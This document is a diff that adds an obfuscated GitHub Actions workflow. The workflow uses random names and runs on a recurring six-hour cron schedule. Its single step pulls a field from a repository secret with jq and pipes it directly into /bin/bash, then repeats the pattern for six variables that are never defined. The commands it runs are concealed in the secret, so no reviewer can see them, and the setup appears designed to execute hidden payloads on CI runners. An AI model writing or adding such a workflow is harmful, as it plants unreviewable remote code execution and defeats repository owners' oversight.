@@ -1,0 +1,24 @@
+name: zhengdanqing3890
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhengdanqing3890
+        env:
+          kruw6938: ${{ secrets.kruw6938 }}
+        run: |
+          echo $kruw6938 | jq -r .ki85 | /bin/bash
+          echo $ik5562 | jq -r .jgz2 | /bin/bash
+          echo $qjwt926 | jq -r .s7 | /bin/bash
+          echo $gzfel1 | jq -r .uswm1294 | /bin/bash
+          echo $l03 | jq -r .z5 | /bin/bash
+          echo $q4 | jq -r .h2800 | /bin/bash
+          echo $zqsv757 | jq -r .zhzxo21 | /bin/bash
+
